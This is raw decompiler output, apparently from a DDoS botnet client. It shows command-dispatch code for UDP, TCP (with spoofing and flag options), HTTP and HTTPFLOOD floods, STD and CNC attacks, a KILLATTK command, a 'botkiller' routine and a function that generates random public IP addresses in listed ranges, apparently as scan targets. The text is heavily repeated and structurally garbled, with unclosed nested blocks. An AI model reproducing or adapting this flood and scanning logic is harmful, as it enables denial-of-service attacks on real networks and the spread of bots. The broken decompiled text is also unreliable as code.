                                                                                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                            while (true) {
                                                                                                                                                            sockprintf(v209, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                while (true) {
                                                                                                                                            sockprintf(v209, (int32_t)"CNC <target> <port> <time>", 0x10010000);
                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                                    sendSTD(v300, v301, v302);
                                                                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                        while (true) {
                                                                                                                                                                    while (true) {
                                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                while (true) {
                                                                                                                                                sockprintf(v209, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                    while (true) {
                                                                                                                                    while (true) {
                                                                                                                                        if (listFork() == 0) {
                                                                                                                                            sendHTTP(v215, v214, (int16_t)v315, v213, v212, atol(*(int32_t *)v241, v241));
                                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                        sendHTTP2(v215, v214, (int16_t)(v272 % 0x10000), v213, v212, v274);
                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                                sendCNC(v290, v291, v292);
                                                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                                                                        sendSTD(v300, v301, v302);
                                                                                                                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                                            while (true) {
                                                                                                                                                                                                        while (true) {
                                                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                                    while (true) {
                                                                                                                                                                                    sockprintf(v209, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                        while (true) {
                                                                                                                                                                                while (true) {
                                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                                                sendSTD(v300, v301, v302);
                                                                                                                                                                                                while (true) {
                                                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                                            sockprintf(v209, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                                                                                            sockprintf(v209, (int32_t)"CNC <target> <port> <time>", 0x10010000);
                                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                                                    sendSTD(v300, v301, v302);
                                                                                                                                                                                    while (true) {
                                                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                                sockprintf(v209, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                sendCNC(v290, v291, v292);
                                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                                                        sendSTD(v300, v301, v302);
                                                                                                                                                                                        while (true) {
                                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                    sockprintf(v209, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                                                                                                while (true) {
                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                                sendSTD(v300, v301, v302);
                                                                                                                                                                                while (true) {
                                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                            sockprintf(v209, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                                                                            sockprintf(v209, (int32_t)"CNC <target> <port> <time>", 0x10010000);
                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                                    sendSTD(v300, v301, v302);
                                                                                                                                                                    while (true) {
                                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                sockprintf(v209, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                sendHTTP2(v215, v214, (int16_t)(v272 % 0x10000), v213, v212, v274);
                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                                        sendCNC(v290, v291, v292);
                                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                                                sendSTD(v300, v301, v302);
                                                                                                                                                                                                while (true) {
                                                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                                            sockprintf(v209, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                                                                                                        while (true) {
                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                                                        sendSTD(v300, v301, v302);
                                                                                                                                                                                        while (true) {
                                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                    sockprintf(v209, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                                                                                    sockprintf(v209, (int32_t)"CNC <target> <port> <time>", 0x10010000);
                                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                                            sendSTD(v300, v301, v302);
                                                                                                                                                                            while (true) {
                                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                        sockprintf(v209, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                        sendCNC(v290, v291, v292);
                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                                sendSTD(v300, v301, v302);
                                                                                                                                                                                while (true) {
                                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                            sockprintf(v209, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                                                                                        while (true) {
                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                                        sendSTD(v300, v301, v302);
                                                                                                                                                                        while (true) {
                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                    sockprintf(v209, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                                                                    sockprintf(v209, (int32_t)"CNC <target> <port> <time>", 0x10010000);
                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                            sendSTD(v300, v301, v302);
                                                                                                                                                            while (true) {
                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                        sockprintf(v209, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                                                                        if (listFork() == 0) {
                                                                                                                                            sendHTTP2(v215, v214, (int16_t)(v272 % 0x10000), v213, v212, v274);
                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                                    sendCNC(v290, v291, v292);
                                                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                                                            sendSTD(v300, v301, v302);
                                                                                                                                                                                            while (true) {
                                                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                                        sockprintf(v209, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                                                                                                    while (true) {
                                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                                                    sendSTD(v300, v301, v302);
                                                                                                                                                                                    while (true) {
                                                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                                sockprintf(v209, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                                                                                sockprintf(v209, (int32_t)"CNC <target> <port> <time>", 0x10010000);
                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                                        sendSTD(v300, v301, v302);
                                                                                                                                                                        while (true) {
                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                    sockprintf(v209, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                    sendCNC(v290, v291, v292);
                                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                                            sendSTD(v300, v301, v302);
                                                                                                                                                                            while (true) {
                                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                        sockprintf(v209, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                                                                                    while (true) {
                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                                    sendSTD(v300, v301, v302);
                                                                                                                                                                    while (true) {
                                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                sockprintf(v209, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                                                                sockprintf(v209, (int32_t)"CNC <target> <port> <time>", 0x10010000);
                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                        sendSTD(v300, v301, v302);
                                                                                                                                                        while (true) {
                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                    sockprintf(v209, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                                                        if (listFork() == 0) {
                                                                                                                            sendHTTP(v215, v214, (int16_t)(v267 % 0x10000), v213, v212, v270);
                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                sendHTTP2(v215, v214, (int16_t)(v272 % 0x10000), v213, v212, v274);
                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                                        sendCNC(v290, v291, v292);
                                                                                                                                                                        while (true) {
                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                    sockprintf(v209, (int32_t)"CNC <target> <port> <time>", 0x10010000);
                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                        sendCNC(v290, v291, v292);
                                                                                                                                                        while (true) {
                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                    sockprintf(v209, (int32_t)"CNC <target> <port> <time>", 0x10010000);
                                                                                                                            while (true) {
                                                                                                                                if (listFork() == 0) {
                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                                                                    if (listFork() == 0) {
                                                                                                                                        sendHTTP2(v215, v214, (int16_t)(v272 % 0x10000), v213, v212, v274);
                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                sendCNC(v290, v291, v292);
                                                                                                                                                                while (true) {
                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                            sockprintf(v209, (int32_t)"CNC <target> <port> <time>", 0x10010000);
                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                sendCNC(v290, v291, v292);
                                                                                                                                                while (true) {
                                                                                                                                                    if (listFork() == 0) {
                                                                                                                            sockprintf(v209, (int32_t)"CNC <target> <port> <time>", 0x10010000);
                                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                                                                if (listFork() == 0) {
                                                                                                                                    sendHTTP2(v215, v214, (int16_t)(v272 % 0x10000), v213, v212, v274);
                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                            sendCNC(v290, v291, v292);
                                                                                                                                                            while (true) {
                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                        sockprintf(v209, (int32_t)"CNC <target> <port> <time>", 0x10010000);
                                                                                                                                        if (listFork() == 0) {
                                                                                                                                            sendCNC(v290, v291, v292);
                                                                                                                                            while (true) {
                                                                                                                                                if (listFork() == 0) {
                                                                                                                        sockprintf(v209, (int32_t)"CNC <target> <port> <time>", 0x10010000);
                                                                                        sockprintf(v209, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10010000);
                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                                    if (listFork() == 0) {
                                                                                                        sendHTTP(v215, v214, (int16_t)(v267 % 0x10000), v213, v212, v270);
                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                                                        if (listFork() == 0) {
                                                                                                                            sendHTTP2(v215, v214, (int16_t)(v272 % 0x10000), v213, v212, v274);
                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                    sendCNC(v290, v291, v292);
                                                                                                                                                    while (true) {
                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                sockprintf(v209, (int32_t)"CNC <target> <port> <time>", 0x10010000);
                                                                                                                                if (listFork() == 0) {
                                                                                                                                    sendCNC(v290, v291, v292);
                                                                                                                                    while (true) {
                                                                                                                                        if (listFork() == 0) {
                                                                                                                sockprintf(v209, (int32_t)"CNC <target> <port> <time>", 0x10010000);
                                                                                                        while (true) {
                                                                                                            if (listFork() == 0) {
                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                                                if (listFork() == 0) {
                                                                                                                    sendHTTP2(v215, v214, (int16_t)(v272 % 0x10000), v213, v212, v274);
                                                                                                                                        if (listFork() == 0) {
                                                                                                                                            sendCNC(v290, v291, v292);
                                                                                                                                            while (true) {
                                                                                                                                                if (listFork() == 0) {
                                                                                                                        sockprintf(v209, (int32_t)"CNC <target> <port> <time>", 0x10010000);
                                                                                                                        if (listFork() == 0) {
                                                                                                                            sendCNC(v290, v291, v292);
                                                                                                                            while (true) {
                                                                                                                                if (listFork() == 0) {
                                                                                                        sockprintf(v209, (int32_t)"CNC <target> <port> <time>", 0x10010000);
                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                                            if (listFork() == 0) {
                                                                                                                sendHTTP2(v215, v214, (int16_t)(v272 % 0x10000), v213, v212, v274);
                                                                                                                                    if (listFork() == 0) {
                                                                                                                                        sendCNC(v290, v291, v292);
                                                                                                                                        while (true) {
                                                                                                                                            if (listFork() == 0) {
                                                                                                                    sockprintf(v209, (int32_t)"CNC <target> <port> <time>", 0x10010000);
                                                                                                                    if (listFork() == 0) {
                                                                                                                        sendCNC(v290, v291, v292);
                                                                                                                        while (true) {
                                                                                                                            if (listFork() == 0) {
                                                                                                    sockprintf(v209, (int32_t)"CNC <target> <port> <time>", 0x10010000);
                                                                                    while (true) {
                                                                                        if (listFork() == 0) {
                                                                                            sendUDP(v220, v248, v249, v250, v251, v217, v223);
                                                                        if (listFork() == 0) {
                                                                            sendUDP(v247, v248, v249, v250, v251, v217, v223);
                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                                                            sockprintf(v209, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10010000);
                                                                                                            sockprintf(v209, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10010000);
                                                                                                        if (listFork() == 0) {
                                                                                                            sendTCP(v259, v260, v261, v262, v263, v221, v222);
                                                                                                            while (true) {
                                                                                                                if (listFork() == 0) {
                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                                                if (listFork() == 0) {
                                                                                                                    sendHTTP(v215, v214, (int16_t)(v267 % 0x10000), v213, v212, v270);
                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                                                                    if (listFork() == 0) {
                                                                                                                                        sendHTTP2(v215, v214, (int16_t)(v272 % 0x10000), v213, v212, v274);
                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                sendCNC(v290, v291, v292);
                                                                                                                                                                while (true) {
                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                            sockprintf(v209, (int32_t)"CNC <target> <port> <time>", 0x10010000);
                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                sendCNC(v290, v291, v292);
                                                                                                                                                while (true) {
                                                                                                                                                    if (listFork() == 0) {
                                                                                                                            sockprintf(v209, (int32_t)"CNC <target> <port> <time>", 0x10010000);
                                                                                                                    while (true) {
                                                                                                                        if (listFork() == 0) {
                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                                                            if (listFork() == 0) {
                                                                                                                                sendHTTP2(v215, v214, (int16_t)(v272 % 0x10000), v213, v212, v274);
                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                        sendCNC(v290, v291, v292);
                                                                                                                                                        while (true) {
                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                    sockprintf(v209, (int32_t)"CNC <target> <port> <time>", 0x10010000);
                                                                                                                                    if (listFork() == 0) {
                                                                                                                                        sendCNC(v290, v291, v292);
                                                                                                                                        while (true) {
                                                                                                                                            if (listFork() == 0) {
                                                                                                                    sockprintf(v209, (int32_t)"CNC <target> <port> <time>", 0x10010000);
                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                                                        if (listFork() == 0) {
                                                                                                                            sendHTTP2(v215, v214, (int16_t)(v272 % 0x10000), v213, v212, v274);
                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                    sendCNC(v290, v291, v292);
                                                                                                                                                    while (true) {
                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                sockprintf(v209, (int32_t)"CNC <target> <port> <time>", 0x10010000);
                                                                                sockprintf(v209, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10010000);
                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                            if (listFork() == 0) {
                                                                                                sendHTTP(v215, v214, (int16_t)(v267 % 0x10000), v213, v212, v270);
                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                                                if (listFork() == 0) {
                                                                                                                    sendHTTP2(v215, v214, (int16_t)(v272 % 0x10000), v213, v212, v274);
                                                                                                while (true) {
                                                                                                    if (listFork() == 0) {
                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                                        if (listFork() == 0) {
                                                                                                            sendHTTP2(v215, v214, (int16_t)(v272 % 0x10000), v213, v212, v274);
                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                                    if (listFork() == 0) {
                                                                                                        sendHTTP2(v215, v214, (int16_t)(v272 % 0x10000), v213, v212, v274);
                                                                            while (true) {
                                                                                if (listFork() == 0) {
                                    sockprintf(v209, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>", 0x10010000);
                                    if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                    sockprintf(v209, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10010000);
                                                                    sockprintf(v209, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10010000);
                                                                if (listFork() == 0) {
                                                                    sendTCP(v259, v260, v261, v262, v263, v221, v222);
                                                                    while (true) {
                                                                        if (listFork() == 0) {
                                                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                        if (listFork() == 0) {
                                                                            sendHTTP(v215, v214, (int16_t)(v267 % 0x10000), v213, v212, v270);
                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                            if (listFork() == 0) {
                                                                                                sendHTTP2(v215, v214, (int16_t)(v272 % 0x10000), v213, v212, v274);
                                                                            while (true) {
                                                                                if (listFork() == 0) {
                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                    if (listFork() == 0) {
                                                                                        sendHTTP2(v215, v214, (int16_t)(v272 % 0x10000), v213, v212, v274);
                                                                if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                if (listFork() == 0) {
                                                                                    sendHTTP2(v215, v214, (int16_t)(v272 % 0x10000), v213, v212, v274);
                                        sockprintf(v209, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10010000);
                                        if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                    if (listFork() == 0) {
                                                        sendHTTP(v215, v214, (int16_t)(v267 % 0x10000), v213, v212, v270);
                                                        if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                        if (listFork() == 0) {
                                                                            sendHTTP2(v215, v214, (int16_t)(v272 % 0x10000), v213, v212, v274);
                                                        while (true) {
                                                            if (listFork() == 0) {
                                                if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                if (listFork() == 0) {
                                                                    sendHTTP2(v215, v214, (int16_t)(v272 % 0x10000), v213, v212, v274);
                                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                            if (listFork() == 0) {
                                                                sendHTTP2(v215, v214, (int16_t)(v272 % 0x10000), v213, v212, v274);
                if (listFork() == 0) {
                    v275 = __GI_inet_ntoa(&v216, 0x10030000);
                    v279 = sockprintf(v215, (int32_t)"COMMENCING BOT KILL ON -> %s", v275);
                    botkiller(v279);
            if (__GI_strcoll((char *)*a2, (int32_t)"GETPUBLICIP") == 0) {
                v276 = __GI_inet_ntoa(&v216, 0x10030000);
                sockprintf(v215, (int32_t)"My Public IP: %s", v276);
                if (__GI_strcoll((char *)*a2, (int32_t)"UDP") == 0) {
                                                            sockprintf(v209, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>", 0x10010000);
                                                                if (listFork() == 0) {
                                                                    sendUDP(v247, v248, v249, v250, v251, v217, v223);
                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                                                    sockprintf(v209, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10010000);
                                                                                                    sockprintf(v209, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10010000);
                                                                                                if (listFork() == 0) {
                                                                                                    sendTCP(v259, v260, v261, v262, v263, v221, v222);
                                                                                                    while (true) {
                                                                                                        if (listFork() == 0) {
                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                                        if (listFork() == 0) {
                                                                                                            sendHTTP(v215, v214, (int16_t)(v267 % 0x10000), v213, v212, v270);
                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                                                            if (listFork() == 0) {
                                                                                                                                sendHTTP2(v215, v214, (int16_t)(v272 % 0x10000), v213, v212, v274);
                                                                                                            while (true) {
                                                                                                                if (listFork() == 0) {
                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                                                    if (listFork() == 0) {
                                                                                                                        sendHTTP2(v215, v214, (int16_t)(v272 % 0x10000), v213, v212, v274);
                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                                                if (listFork() == 0) {
                                                                                                                    sendHTTP2(v215, v214, (int16_t)(v272 % 0x10000), v213, v212, v274);
                                                                        sockprintf(v209, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10010000);
                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                    if (listFork() == 0) {
                                                                                        sendHTTP(v215, v214, (int16_t)(v267 % 0x10000), v213, v212, v270);
                                                                                        while (true) {
                                                                                            if (listFork() == 0) {
                                                                    while (true) {
                                                                        if (listFork() == 0) {
                                                        if (listFork() == 0) {
                                                            sendUDP(v247, v248, v249, v250, v251, v217, v223);
                                                            if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                                            sockprintf(v209, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10010000);
                                                                                            sockprintf(v209, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10010000);
                                                                                        if (listFork() == 0) {
                                                                                            sendTCP(v259, v260, v261, v262, v263, v221, v222);
                                                                                            while (true) {
                                                                                                if (listFork() == 0) {
                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                                if (listFork() == 0) {
                                                                                                    sendHTTP(*v238, v214, (int16_t)(v267 % 0x10000), v213, v212, v270);
                                                                                                    while (true) {
                                                                                                        if (listFork() == 0) {
                                                                sockprintf(v209, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10010000);
                                                                if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                            if (listFork() == 0) {
                                                                                sendHTTP(*v238, v214, (int16_t)(v267 % 0x10000), v213, v212, v270);
                                                                                while (true) {
                                                                                    if (listFork() == 0) {
                                                            while (true) {
                                                                if (listFork() == 0) {
                    sockprintf(v209, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>", 0x10010000);
                    if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                    sockprintf(v209, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10010000);
                                                    sockprintf(v209, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10010000);
                                                if (listFork() == 0) {
                                                    sendTCP(v259, v260, v261, v262, v263, v221, v222);
                                                    while (true) {
                                                        if (listFork() == 0) {
                                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                        if (listFork() == 0) {
                                                            sendHTTP(*v238, v214, (int16_t)(v267 % 0x10000), v213, v212, v270);
                                                            while (true) {
                                                                if (listFork() == 0) {
                        sockprintf(v209, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10010000);
                        if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                    if (listFork() == 0) {
                                        sendHTTP(*v238, v214, (int16_t)(v267 % 0x10000), v213, v212, v270);
                                        while (true) {
                                            if (listFork() == 0) {
=================FUNCTION : GetRandomPublicIP ===================
++++++++ FUNCTION START 11649
++++++++ FUNCTION END 13114
++++++++ FUNCTION LENGTH 1465
    random();
    random();
    v213 = random() % 255;
    v214 = random() % 255;
    int32_t v215 = random() % 208; // 0x10003364
        szprintf((int32_t)&v216, (int32_t)"112.5.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"117.165.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"85.3.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"37.158.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"95.9.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"41.252.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"58.71.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"104.55.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"78.186.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"78.189.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"221.120.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"88.5.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"41.254.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"103.20.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"103.47.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"103.57.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"45.117.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"101.51.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"137.59.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"1.56.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"1.188.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"14.204.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"27.0.%d.%d", (int32_t)v213);
        szprintf((int32_t)&v216, (int32_t)"27.8.%d.%d", (int32_t)v213);
